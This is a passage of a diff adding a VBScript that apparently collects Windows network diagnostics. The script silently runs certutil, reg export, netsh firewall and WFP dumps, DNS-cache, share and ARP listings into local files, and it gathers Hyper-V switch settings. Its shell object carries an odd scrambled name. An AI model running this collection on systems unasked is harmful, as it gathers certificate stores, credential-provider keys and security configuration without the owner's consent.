+    cmd = "cmd /c netsh mbn show readyinfo interface=* >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c netsh mbn show capability interface=* >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c ipconfig /all >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    RunCmd "echo.", outputFileName
+    RunCmd "echo ROUTE PRINT:", outputFileName
+    RunCmd "route print", outputFileName
+    
+    Set envInfoFile = FSO.OpenTextFile(outputFileName, 8, True)
+    envInfoFile.WriteLine("")
+    envInfoFile.WriteLine("Machine certificates...")
+    envInfoFile.WriteLine("")
+    envInfoFile.Close
+
+    cmd = "cmd /c certutil -v -store -silent My >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    Set envInfoFile = FSO.OpenTextFile(outputFileName, 8, True)
+    envInfoFile.WriteLine("")
+    envInfoFile.WriteLine("User certificates...")
+    envInfoFile.WriteLine("")
+    envInfoFile.Close
+
+    cmd = "cmd /c certutil -v -store -silent -user My >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    Set envInfoFile = FSO.OpenTextFile(outputFileName, 8, True)
+    envInfoFile.WriteLine("")
+    envInfoFile.WriteLine("Root certificates (machine store)...")
+    envInfoFile.WriteLine("")
+    envInfoFile.Close
+
+    cmd = "cmd /c certutil -v -store -silent root >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    Set envInfoFile = FSO.OpenTextFile(outputFileName, 8, True)
+    envInfoFile.WriteLine("")
+    envInfoFile.WriteLine("Root certificates (enterprise store)...")
+    envInfoFile.WriteLine("")
+    envInfoFile.Close
+ 
+    cmd = "cmd /c certutil -v -enterprise -store -silent NTAuth >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    Set envInfoFile = FSO.OpenTextFile(outputFileName, 8, True)
+    envInfoFile.WriteLine("")
+    envInfoFile.WriteLine("Root certificates (user store)...")
+    envInfoFile.WriteLine("")
+    envInfoFile.Close
+
+    cmd = "cmd /c certutil -v -user -store -silent root >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+End Sub
+
+'Comments: Function to dump a tree under a registry path into a file
+Sub DumpRegKey(outputFileName,regpath)
+    On Error Resume Next
+    Dim cmd
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    cmd = "cmd /c reg export " & regpath & "  " & outputFileName & " /y"
+    DKGlXlJ.Run cmd, 0, True
+
+End Sub
+
+Sub DumpAllKeys
+    On Error Resume Next
+    Dim NotifRegFile, RegFolder, Key
+
+    RegFolder = "Reg"
+
+    if Not FSO.FolderExists(RegFolder) Then
+       FSO.CreateFolder RegFolder
+    End If
+
+    ' Dump WLAN registry keys
+    AllCredRegFile = RegFolder + "\AllCred.reg.txt"
+    AllCredFilterFile = RegFolder + "\AllCredFilter.reg.txt"
+    CredRegFileA = RegFolder + "\{07AA0886-CC8D-4e19-A410-1C75AF686E62}.reg.txt"
+    CredRegFileB = RegFolder + "\{33c86cd6-705f-4ba1-9adb-67070b837775}.reg.txt"
+    CredRegFileC = RegFolder + "\{edd749de-2ef1-4a80-98d1-81f20e6df58e}.reg.txt"
+    APIPermRegFile = RegFolder + "\APIPerm.reg.txt"
+    NotifRegFile = RegFolder + "\Notif.reg.txt"
+    GPTRegFile = RegFolder + "\GPT.reg.txt"
+    CUWlanSvcRegFile = RegFolder + "\HKCUWlanSvc.reg.txt"
+    LMWlanSvcRegFile = RegFolder + "\HKLMWlanSvc.reg.txt"
+    NidRegFile = RegFolder + "\NetworkProfiles.reg.txt"
+
+    call DumpRegKey(NotifRegFile ,"""HKLM\SYSTEM\CurrentControlSet\Control\Winlogon\Notifications""")
+    call DumpRegKey(AllCredRegFile ,"""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers""")
+    call DumpRegKey(AllCredFilterFile,"""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Provider Filters""")
+    call DumpRegKey(CredRegFileA ,"""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{07AA0886-CC8D-4e19-A410-1C75AF686E62}""")
+    call DumpRegKey(CredRegFileB ,"""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{33c86cd6-705f-4ba1-9adb-67070b837775}""")
+    call DumpRegKey(CredRegFileC ,"""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Provider Filters\{edd749de-2ef1-4a80-98d1-81f20e6df58e}""")
+    call DumpRegKey(APIPermRegFile ,"""HKLM\SYSTEM\CurrentControlSet\Services\Wlansvc\Parameters\WlanAPIPermissions""")
+
+    call DumpRegKey(GPTRegFile , """HKLM\SOFTWARE\Policies\Microsoft\Windows\Wireless\GPTWirelessPolicy""")
+    call DumpRegKey(CUWlanSvcRegFile ,"""HKCU\SOFTWARE\Microsoft\Wlansvc""")
+    call DumpRegKey(LMWlanSvcRegFile ,"""HKLM\SOFTWARE\Microsoft\Wlansvc""")
+
+    ' Dump Dot3 registry keys
+    LMDot3SvcRegFile = RegFolder + "\HKLMDot3Svc.reg.txt"
+    CUDot3SvcRegFile = RegFolder + "\HKCUDot3Svc.reg.txt"
+    LGPPolicyFile  = RegFolder + "\L2GP.reg.txt"
+
+    call DumpRegKey(LMDot3SvcRegFile ,"""HKLM\SOFTWARE\Microsoft\dot3svc""")
+    call DumpRegKey(CUDot3SvcRegFile ,"""HKCU\SOFTWARE\Microsoft\dot3svc""")
+    call DumpRegKey(LGPPolicyFile  ,"""HKLM\SOFTWARE\Policies\Microsoft\Windows\WiredL2\GP_Policy""")
+
+    call DumpRegKey(NidRegFile  ,"""HKLM\SOFTWARE\MICROSOFT\Windows NT\CurrentVersion\NetworkList""")
+    
+    ' Dump WCM registry keys
+    WCMPolicyRegFile = RegFolder + "\WCMPolicy.reg.txt"
+    call DumpRegKey(WCMPolicyRegFile ,"""HKLM\SOFTWARE\Policies\Microsoft\WcmSvc""")
+
+
+End Sub
+
+' Dump Winsock LSP catalog
+Sub DumpWinsockCatalog(outputFileName)
+    On Error Resume Next
+    Dim envInfoFile
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    cmd = "cmd /c netsh winsock show catalog > " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+End Sub
+
+' Dump the Windows Firewall Configuration
+Sub GetWindowsFirewallInfo(configFileName, logFileName, effectiveRulesFileName, consecLogFileName, logFileNameVerbose, consecLogFileNameVerbose)
+    On Error Resume Next
+    Dim envInfoFile
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    cmd = "cmd /c echo Current Profiles: > " & configFileName
+    DKGlXlJ.Run cmd, 0, True
+    cmd = "cmd /c echo ------------------------------------------------------------------------ >> " & configFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    'Dump the current profiles  
+    cmd = "cmd /c netsh advfirewall monitor show currentprofile >> " & configFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c echo Firewall Configuration: >> " & configFileName
+    DKGlXlJ.Run cmd, 0, True
+    cmd = "cmd /c echo ------------------------------------------------------------------------ >> " & configFileName
+    DKGlXlJ.Run cmd, 0, True   
+
+    ' Dump the firewall configuration
+    cmd = "cmd /c netsh advfirewall monitor show firewall >> " & configFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c echo Connection Security  Configuration: >> " & configFileName
+    DKGlXlJ.Run cmd, 0, True
+    cmd = "cmd /c echo ------------------------------------------------------------------------ >> " & configFileName
+    DKGlXlJ.Run cmd, 0, True       
+
+    'Dump the connection security configuration
+    cmd = "cmd /c netsh advfirewall monitor show consec >> " & configFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c echo Firewall Rules : >> " & configFileName
+    DKGlXlJ.Run cmd, 0, True
+    cmd = "cmd /c echo ------------------------------------------------------------------------ >> " & configFileName
+    DKGlXlJ.Run cmd, 0, True       
+
+    'Dump the firewall rules
+    cmd = "cmd /c netsh advfirewall firewall show rule name=all verbose >> " & configFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c echo Connection Security  Rules : >> " & configFileName
+    DKGlXlJ.Run cmd, 0, True
+    cmd = "cmd /c echo ------------------------------------------------------------------------ >> " & configFileName
+    DKGlXlJ.Run cmd, 0, True       
+    
+    'Dump the connection security rules
+    cmd = "cmd /c netsh advfirewall consec show rule name=all verbose >> " & configFileName
+    DKGlXlJ.Run cmd, 0, True   
+    
+    'Dump the firewall rules from Dynamic Store
+    
+    cmd = "cmd /c echo Firewall Rules currently enforced : > " & effectiveRulesFileName
+    DKGlXlJ.Run cmd, 0, True
+    cmd = "cmd /c echo ------------------------------------------------------------------------ >> " & effectiveRulesFileName
+    DKGlXlJ.Run cmd, 0, True           
+    
+    cmd = "cmd /c netsh advfirewall monitor show firewall rule name=all >> " & effectiveRulesFileName
+    DKGlXlJ.Run cmd, 0, True
+    
+    'Dump the connection security rules from Dynamic Store
+    
+    cmd = "cmd /c echo Connection Security Rules currently enforced : >> " & effectiveRulesFileName
+    DKGlXlJ.Run cmd, 0, True
+    cmd = "cmd /c echo ------------------------------------------------------------------------ >> " & effectiveRulesFileName
+    DKGlXlJ.Run cmd, 0, True       
+    
+    cmd = "cmd /c netsh advfirewall monitor show consec rule name=all >> " & effectiveRulesFileName
+    DKGlXlJ.Run cmd, 0, True   
+
+    
+
+    'Export the operational log
+    cmd = "cmd /c wevtutil epl ""Microsoft-Windows-Windows Firewall With Advanced Security/Firewall"" " & logFileName
+    DKGlXlJ.Run cmd, 0, True   
+
+    'Archive the log so that it could be read on different machines
+    cmd = "cmd /c wevtutil al " & logFileName
+    DKGlXlJ.Run cmd, 0, True   
+    
+      'Export the operational log
+    cmd = "cmd /c wevtutil epl ""Microsoft-Windows-Windows Firewall With Advanced Security/ConnectionSecurity"" " & consecLogFileName
+    DKGlXlJ.Run cmd, 0, True   
+
+    'Archive the log so that it could be read on different machines
+    cmd = "cmd /c wevtutil al " & consecLogFileName
+    DKGlXlJ.Run cmd, 0, True   
+
+   
+    'Export the operational log
+    cmd = "cmd /c wevtutil epl ""Microsoft-Windows-Windows Firewall With Advanced Security/FirewallVerbose"" " & logFileNameVerbose
+    DKGlXlJ.Run cmd, 0, True   
+
+    'Archive the log so that it could be read on different machines
+    cmd = "cmd /c wevtutil al " & logFileNameVerbose
+    DKGlXlJ.Run cmd, 0, True   
+    
+      'Export the operational log
+    cmd = "cmd /c wevtutil epl ""Microsoft-Windows-Windows Firewall With Advanced Security/ConnectionSecurityVerbose"" " & consecLogFileNameVerbose
+    DKGlXlJ.Run cmd, 0, True   
+
+    'Archive the log so that it could be read on different machines
+    cmd = "cmd /c wevtutil al " & consecLogFileNameVerbose
+    DKGlXlJ.Run cmd, 0, True   
+    
+End Sub
+
+Sub GetWfpInfo(outputFileName, logFileName)
+    On Error Resume Next
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    cmd = "cmd /c netsh wfp show filters file=" & outputFileName & " > " & logFileName
+    DKGlXlJ.Run cmd, 0, True
+
+End Sub
+
+' Dump Netio State
+Sub GetNetioInfo(outputFileName)
+    On Error Resume Next
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    cmd = "cmd /c netsh interface teredo show state > " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c netsh interface httpstunnel show interface >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+    cmd = "cmd /c netsh interface httpstunnel show statistics >> " & outputFileName
+    DKGlXlJ.Run cmd, 0, True
+
+End Sub
+
+Sub GetDnsInfo(logFileName)
+    On Error Resume Next
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    RunCmd "echo IPCONFIG /DISPLAYDNS: ", logFileName   
+    RunCmd "ipconfig /displaydns", logFileName
+
+    RunCmd "echo. ", logFileName
+    RunCmd "echo NETSH NAMESPACE SHOW EFFECTIVE:", logFileName
+    RunCmd "netsh namespace show effective", logFileName
+    
+    RunCmd "echo.", logFileName
+    RunCmd "echo NETSH NAMESPACE SHOW POLICY:", logFileName
+    RunCmd "netsh namespace show policy", logFileName
+
+End Sub
+
+Sub GetNeighborInfo(logFileName)
+    On Error Resume Next
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    RunCmd "echo ARP -A:", logFileName
+    RunCmd "arp -a", logFileName
+
+    RunCmd "echo.", logFileName
+    RunCmd "echo NETSH INT IPV6 SHOW NEIGHBORS:", logFileName
+    RunCmd "netsh int ipv6 show neigh", logFileName
+
+End Sub
+
+Sub GetFileSharingInfo(logFileName)
+    On Error Resume Next
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    RunCmd "echo NBTSTAT -N:", logFileName
+    RunCmd "nbtstat -n", logFileName
+
+    RunCmd "echo.", logFileName
+    RunCmd "echo NBTSTAT -C:", logFileName
+    RunCmd "nbtstat -c", logFileName
+
+    RunCmd "echo.", logFileName
+    RunCmd "echo NET CONFIG RDR:", logFileName
+    RunCmd "net config rdr", logFileName
+
+'   Run the following 2 commands only if lanmanserver service is running
+'   In WOA build, FileSharing is disabled - hence this results in a prompt
+'   which halts the script at that point and netsh trace stop can go on indefinitely
+
+    strComputer = "."
+    Set objWmiService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+    strQuery = "Select * from WIN32_Service where Name = 'lanmanserver' AND Started = True"
+    Set objService = objWmiService.ExecQuery (strQuery)
+    
+    RunCmd "echo.", logFileName
+    RunCmd "echo NET CONFIG SRV:", logFileName
+
+    If objService.Count = 1 Then
+        RunCmd "net config srv", logFileName
+    Else 
+        RunCmd "echo The Server service is not running.", logFileName
+    End If
+
+    RunCmd "echo.", logFileName
+    RunCmd "echo NET SHARE:", logFileName
+
+    If objService.Count = 1 Then
+        RunCmd "net share", logFileName
+    Else
+        RunCmd "echo The Server service is not running.", logFileName
+    End If
+
+End Sub
+
+Sub GetGPResultInfo(logFileName)
+    On Error Resume Next
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    cmd = "cmd /c gpresult /scope:computer /v 1> " & logFileName & " 2>&1"
+    DKGlXlJ.Run cmd, 0, False
+
+End Sub
+
+Sub GetNetEventsInfo(outputFileName, logFileName)
+    On Error Resume Next
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    cmd = "cmd /c netsh wfp show netevents file=" & outputFileName & " 1> " & logFileName & " 2>&1"
+    DKGlXlJ.Run cmd, 0, True
+
+End Sub
+
+Sub GetShowStateInfo(outputFileName, logFileName)
+    On Error Resume Next
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    cmd = "cmd /c netsh wfp show state file=" & outputFileName & " 1> " & logFileName & " 2>&1"
+    DKGlXlJ.Run cmd, 0, True
+
+End Sub
+
+Sub GetSysPortsInfo(outputFileName, logFileName)
+    On Error Resume Next
+
+    Set DKGlXlJ = WScript.CreateObject( "WScript.Shell" )
+
+    cmd = "cmd /c netsh wfp show sysports file=" & outputFileName & " 1> " & logFileName & " 2>&1"
+    DKGlXlJ.Run cmd, 0, True
+
+End Sub
+
+' Add XML node entry
+Sub AddXmlNodeEntry(xmlDoc, entryName, entryValue, parentEntry, entryObject)
+    On Error Resume Next
+    Set entryObject = xmlDoc.createElement(entryName)
+    If (IsNull(entryValue) = False) Then 
+        entryObject.Text = entryValue
+    End If
+    parentEntry.appendChild entryObject
+End Sub
+
+' Dump Vmswitch State
+Sub GetVmswitchInfo(outputFileName)
+    On Error Resume Next
+
+    strComputer = "."
+    Set objCimService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+    onOffState = Array("On", "Off")
+    reservationMode = Array("Default", "Weight", "Absolute", "None")
+    nicTypeArray = Array("Synthetic", "Emulated", "Internal", "External")
+    extensionTypeArray = Array("Unknown", "Capture", "Filter", "Forwarding", "Monitoring", "Native")
+    enabledStatesArray = Array("Unknown", "Unknown", "Enabled", "Disabled")
+    vlanModeArray = Array("Unknown","Access","Trunk","Private")
+    PvlanModeArray = Array("Unknown","Isolated","Community","Promiscuous")
+    monitorModeArray = Array("None","Destination","Source")
+    aclActionArray = Array("Unknown","Allow","Deny","Meter")
+    aclDirectionArray = Array("Unknown","Inbound","Outbound")
+    aclApplicabilityArray = Array("Unknown","Local","Remote")
+    aclTypeArray = Array("Unknown","MAC","IPv4","IPv6")
+    isolationModeArray = Array("None","NativeVirtualSubnet","ExternalVirtualSubnet","VLAN")
+    iovInterruptModerationArray = Array("Default", "Adaptive", "Off", "Low", "Medium", "High")
+
+    strQuery = "Select * from WIN32_Service where Name = 'vmms' AND Started = True"
+    Set objVmmsService = objCimService.ExecQuery (strQuery)
+    If objVmmsService.Count > 0 Then
+        Set xmlDoc = CreateObject("Microsoft.XMLDOM")
+        Set objRoot = xmlDoc.createElement("VmswitchInfo")
+        xmlDoc.appendChild objRoot
+        Set objVirtualizationService = GetObject("winmgmts:\\" & strComputer & "\root\virtualization\v2")
+        strQuery = "Select * from MSVM_VirtualEthernetSwitch"
+        Set switches = objVirtualizationService.ExecQuery (strQuery)
+        For Each switch in switches
+            Call AddXmlNodeEntry(xmlDoc, "Switch", null, objRoot, objSwitch)
+            Call AddXmlNodeEntry(xmlDoc, "Name", switch.Name, objSwitch, objSwitchName)
+            Call AddXmlNodeEntry(xmlDoc, "FriendlyName", switch.ElementName, objSwitch, objSwitchFriendlyName)
+            strQuery = "Select * from MSVM_VirtualEthernetSwitchSettingData WHERE VirtualSystemIdentifier='" + switch.Name + "'"
+            Set switchSetting = objVirtualizationService.ExecQuery (strQuery).ItemIndex(0)
+            switchReservationMode = reservationMode(switchSetting.BandwidthReservationMode)
+            iovPreferred = switchSetting.IOVPreferred
+            
+            ' Bandwidth info
+            Call AddXmlNodeEntry(xmlDoc, "SwitchBandwidth", null, objSwitch, objBandwidth)
+            Call AddXmlNodeEntry(xmlDoc, "BandwidthReservationMode", switchReservationMode, objBandwidth, objSwitchBandwidthReservationMode)
+            strQuery = "Select * from MSVM_EthernetSwitchBandwidthData WHERE SystemName ='" + switch.Name + "'"
+            Set queryResult = objVirtualizationService.ExecQuery (strQuery)
+            If (queryResult.Count > 0) Then
+            Set bandwidth = queryResult.ItemIndex(0)
+                Call AddXmlNodeEntry(xmlDoc, "BandwidthCapacity", bandwidth.Capacity, objBandwidth, objSwitchBandwidthCapacity)
+                Call AddXmlNodeEntry(xmlDoc, "DefaultFlowReservation", bandwidth.DefaultFlowReservation, objBandwidth, objSwitchDefaultFlowReservation)
+                Call AddXmlNodeEntry(xmlDoc, "DefaultFlowReservationPercentage", bandwidth.DefaultFlowReservationPercentage, objBandwidth, objSwitchDefaultFlowReservationPercentage)
+                Call AddXmlNodeEntry(xmlDoc, "DefaultFlowWeight", bandwidth.DefaultFlowWeight, objBandwidth, objSwitchDefaultFlowWeight)
+                Call AddXmlNodeEntry(xmlDoc, "Reservation", bandwidth.Reservation, objBandwidth, objSwitchReservation)
+            End if
+            
+            ' Offload info
+            Call AddXmlNodeEntry(xmlDoc, "SwitchOffload", null, objSwitch, objOffload)
+            Call AddXmlNodeEntry(xmlDoc, "IOVPreferred", iovPreferred, objOffload, objSwitchIOVPreferred)
+            strQuery = "Select * from MSVM_EthernetSwitchHardwareOffloadData WHERE SystemName='" + switch.Name + "'"
+            Set queryResult = objVirtualizationService.ExecQuery (strQuery)
+            If (queryResult.Count > 0) Then
+                Set offload = queryResult.ItemIndex(0)
+                Call AddXmlNodeEntry(xmlDoc, "IovQueuePairCapacity", offload.IovQueuePairCapacity, objOffload, objSwitchIovQueuePairCapacity)
+                Call AddXmlNodeEntry(xmlDoc, "IovQueuePairUsage", offload.IovQueuePairUsage, objOffload, objSwitchIovQueuePairUsage )
+                Call AddXmlNodeEntry(xmlDoc, "IovVfCapacity", offload.IovVfCapacity, objOffload, objSwitchIovVfCapacity)
+                Call AddXmlNodeEntry(xmlDoc, "IovVfUsage", offload.IovVfUsage, objOffload, IovVfUsage)
+                Call AddXmlNodeEntry(xmlDoc, "IPsecSACapacity", offload.IPsecSACapacity, objOffload, objSwitchIPsecSACapacity)
+                Call AddXmlNodeEntry(xmlDoc, "IPsecSAUsage", offload.IPsecSAUsage, objOffload, objSwitchIPsecSAUsage)
+            End if
+
+            ' Extension info
+            Call AddXmlNodeEntry(xmlDoc, "SwitchExtensions", null, objSwitch, objExtensionList)
+            strQuery = "Select * from MSVM_EthernetSwitchExtension WHERE SystemName='" + switch.Name + "'"
+            Set extensionList = objVirtualizationService.ExecQuery (strQuery)
+            For Each extension In extensionList
+                Call AddXmlNodeEntry(xmlDoc, "Extension", null, objExtensionList, objExtension)
+                Call AddXmlNodeEntry(xmlDoc, "ElementName", extension.ElementName, objExtension, objExtensionElementName)
+                Call AddXmlNodeEntry(xmlDoc, "Name", extension.Name, objExtension, objExtensionName)
+                Call AddXmlNodeEntry(xmlDoc, "ExtensionType", extensionTypeArray(extension.ExtensionType), objExtension, objExtensionExtensionType)
+                Call AddXmlNodeEntry(xmlDoc, "EnabledState", enabledStatesArray(extension.EnabledState), objExtension, objExtensionEnabledState)
+                Call AddXmlNodeEntry(xmlDoc, "EnabledDefault", enabledStatesArray(extension.EnabledDefault), objExtension, objExtensionEnabledDefault)
+                Call AddXmlNodeEntry(xmlDoc, "Vendor", extension.Vendor, objExtension, objExtensionVendor)
+                Call AddXmlNodeEntry(xmlDoc, "Version", extension.Version, objExtension, objExtensionVersion)
+            Next
+            
+            ' Port info
+            strQuery = "Select * from MSVM_EthernetSwitchPort WHERE SystemName='" + switch.Name + "'"
+            Set switchPort = objVirtualizationService.ExecQuery (strQuery)
+            For Each port In switchPort
+                Call AddXmlNodeEntry(xmlDoc, "Port", null, objSwitch, objPort)
+                Call AddXmlNodeEntry(xmlDoc, "Name", port.Name, objPort, objPortName)
+                Call AddXmlNodeEntry(xmlDoc, "FriendlyName", port.ElementName, objPort, objPortFriendlyName)
+                
+                'Port offload info
+                Call AddXmlNodeEntry(xmlDoc, "PortOffload", null, objPort, objPortOffload)
+                strQuery = "Select * from MSVM_EthernetSwitchPortOffloadData WHERE DeviceID='" + port.Name + "'"
+                Set queryResult = objVirtualizationService.ExecQuery (strQuery)
+                If (queryResult.Count > 0) Then
+                    Set portOffload = queryResult.ItemIndex(0)
+                    Call AddXmlNodeEntry(xmlDoc, "IovOffloadUsage", portOffload.IovOffloadUsage, objPortOffload, objPortIovOffloadUsage)
+                    Call AddXmlNodeEntry(xmlDoc, "IovQueuePairUsage", portOffload.IovQueuePairUsage, objPortOffload, objPortIovQueuePairUsage)
+                    Call AddXmlNodeEntry(xmlDoc, "IovVfDataPathActive", portOffload.IovVfDataPathActive, objPortOffload, objPortIovVfDataPathActive)
+                    Call AddXmlNodeEntry(xmlDoc, "IovVfId", portOffload.IovVfId, objPortOffload, objPortIovVfId)
+                    Call AddXmlNodeEntry(xmlDoc, "IpsecCurrentOffloadSaCount", portOffload.IpsecCurrentOffloadSaCount, objPortOffload, objPortIpsecCurrentOffloadSaCount)
+                    Call AddXmlNodeEntry(xmlDoc, "VMQId", portOffload.VMQId, objPortOffload, objPortVMQId)
+                    Call AddXmlNodeEntry(xmlDoc, "VMQOffloadUsage", portOffload.VMQOffloadUsage, objPortOffload, objPortVMQOffloadUsage)
+                End if
+                
+                'Port Bandwidth feature status
+                Call AddXmlNodeEntry(xmlDoc, "PortBandwidth", null, objPort, objPortBandwidth)
+                strQuery = "Select * from MSVM_EthernetSwitchPortBandwidthData WHERE DeviceID='" + port.Name + "'"
+                Set queryResult = objVirtualizationService.ExecQuery (strQuery)
+                If (queryResult.Count > 0) Then
+                    Set portBandwidth = queryResult.ItemIndex(0)
+                    Call AddXmlNodeEntry(xmlDoc, "BandwidthReservationPercentage", portBandwidth.CurrentBandwidthReservationPercentage, objPortBandwidth, objPortCurrentBandwidthReservationPercentage)
+                End If
+                
+                'Get the setting data for the port
+                Set portSettingObject = port.Associators_("Msvm_ElementSettingData", "Msvm_EthernetPortAllocationSettingData").ItemIndex(0)
+                'Port bandwidth setting
+                Set queryResult = portSettingObject.Associators_("Msvm_EthernetPortSettingDataComponent", "Msvm_EthernetSwitchPortBandwidthSettingData")
+                If (queryResult.Count > 0) Then
+                    Set portBandwidthData = queryResult.ItemIndex(0)
+                    Call AddXmlNodeEntry(xmlDoc, "BurstLimit", portBandwidthData.BurstLimit, objPortBandwidth, objPortBurstLimit)
+                    Call AddXmlNodeEntry(xmlDoc, "BurstSize", portBandwidthData.BurstSize, objPortBandwidth, objPortBurstSize)
+                    Call AddXmlNodeEntry(xmlDoc, "Limit", portBandwidthData.Limit, objPortBandwidth, objPortLimit)
+                    Call AddXmlNodeEntry(xmlDoc, "Reservation", portBandwidthData.Reservation, objPortBandwidth, objPortReservation)
+                    Call AddXmlNodeEntry(xmlDoc, "Weight", portBandwidthData.Weight, objPortBandwidth, objPortBurstWeight)
+                End if
+                ' Port offload setting
+                Set queryResult = portSettingObject.Associators_("Msvm_EthernetPortSettingDataComponent", "Msvm_EthernetSwitchPortOffloadSettingData")
+                If (queryResult.Count > 0) Then
+                    Set portOffloadData = queryResult.ItemIndex(0)
+                    if (portOffloadData.IOVInterruptModeration <= 2) Then
+                        iovInterruptModeration = iovInterruptModerationArray(portOffloadData.IOVInterruptModeration)
+                    Else
+                        iovInterruptModeration = iovInterruptModerationArray(((portOffloadData.IOVInterruptModeration)/100)+2)
+                    End if
+                    Call AddXmlNodeEntry(xmlDoc, "IOVInterruptModeration", iovInterruptModeration, objPortOffload, objPortIOVInterruptModeration)
+                    Call AddXmlNodeEntry(xmlDoc, "IOVOffloadWeight", portOffloadData.IOVOffloadWeight, objPortOffload, objPortIOVOffloadWeight)
+                    Call AddXmlNodeEntry(xmlDoc, "IOVQueuePairsRequested", portOffloadData.IOVQueuePairsRequested, objPortOffload, objPortIOVQueuePairsRequested)
+                    Call AddXmlNodeEntry(xmlDoc, "IPSecOffloadLimit", portOffloadData.IPSecOffloadLimit, objPortOffload, objPortIPSecOffloadLimit)
+                    Call AddXmlNodeEntry(xmlDoc, "VMQOffloadWeight", portOffloadData.VMQOffloadWeight, objPortOffload, objPortVMQOffloadWeight)
+                End If
+                ' Port security setting
+                Set queryResult = portSettingObject.Associators_("Msvm_EthernetPortSettingDataComponent", "Msvm_EthernetSwitchPortSecuritySettingData")
+                If (queryResult.Count > 0) Then
+                    Set portSecurityData = queryResult.ItemIndex(0)
+                    Call AddXmlNodeEntry(xmlDoc, "PortSecurity", null, objPort, objPortSecurity)
+                    Call AddXmlNodeEntry(xmlDoc, "AllowIeeePriorityTag", onOffState(portSecurityData.AllowIeeePriorityTag+1), objPortSecurity, objPortAllowIeeePriorityTag)
+                    Call AddXmlNodeEntry(xmlDoc, "AllowMacSpoofing", onOffState(portSecurityData.AllowMacSpoofing+1), objPortSecurity, objPortAllowMacSpoofing)
+                    Call AddXmlNodeEntry(xmlDoc, "AllowTeaming", onOffState(portSecurityData.AllowTeaming+1), objPortSecurity, objPortAllowTeaming)
+                    Call AddXmlNodeEntry(xmlDoc, "EnableDhcpGuard", onOffState(portSecurityData.EnableDhcpGuard+1), objPortSecurity, objPortEnableDhcpGuard)
+                    Call AddXmlNodeEntry(xmlDoc, "EnableRouterGuard", onOffState(portSecurityData.EnableRouterGuard+1), objPortSecurity, objPortEnableRouterGuard)
+                    Call AddXmlNodeEntry(xmlDoc, "MonitorMode", monitorModeArray(portSecurityData.MonitorMode), objPortSecurity, objPortMonitorMode)
+                    Call AddXmlNodeEntry(xmlDoc, "MonitorSession", portSecurityData.MonitorSession, objPortSecurity, objPortMonitorSession)
+                    Call AddXmlNodeEntry(xmlDoc, "TeamName", portSecurityData.TeamName, objPortSecurity, objPortTeamName)
+                    Call AddXmlNodeEntry(xmlDoc, "TeamNumber", portSecurityData.TeamNumber, objPortSecurity, objPortTeamNumber)
+                    Call AddXmlNodeEntry(xmlDoc, "VirtualSubnetId", portSecurityData.VirtualSubnetId, objPortSecurity, objPortVirtualSubnetId)
+                    Call AddXmlNodeEntry(xmlDoc, "StormLimit", portSecurityData.StormLimit, objPortSecurity, objPortStormLimit)
+                    Call AddXmlNodeEntry(xmlDoc, "DynamicIPAddressLimit", portSecurityData.DynamicIPAddressLimit, objPortSecurity, objPortDynamicIPAddressLimit)
+                End If
+                ' Port isolation setting
+                Set queryResult = portSettingObject.Associators_("Msvm_EthernetPortSettingDataComponent", "Msvm_EthernetSwitchPortIsolationSettingData")
+                If (queryResult.Count > 0) Then
+                    Set portIsolationData = queryResult.ItemIndex(0)
+                    Call AddXmlNodeEntry(xmlDoc, "PortIsolation", null, objPort, objPortIsolation)
+                    Call AddXmlNodeEntry(xmlDoc, "IsolationMode", isolationModeArray(portIsolationData.IsolationMode), objPortIsolation, objPortIsolationMode)
+                    Call AddXmlNodeEntry(xmlDoc, "DefaultIsolationId", portIsolationData.DefaultIsolationId, objPortIsolation, objPortDefaultIsolationId)
+                    Call AddXmlNodeEntry(xmlDoc, "AllowUntaggedTraffic", onOffState(portIsolationData.AllowUntaggedTraffic+1), objPortIsolation, objPortAllowUntaggedTraffic)
+                    Call AddXmlNodeEntry(xmlDoc, "EnableMultiTenantStack", onOffState(portIsolationData.EnableMultiTenantStack+1), objPortIsolation, objPortEnableMultiTenantStack)
+                End If
+                ' Port routing domain setting
+                Set queryResult = portSettingObject.Associators_("Msvm_EthernetPortSettingDataComponent", "Msvm_EthernetSwitchPortRoutingDomainSettingData")
+                If (queryResult.Count > 0) Then
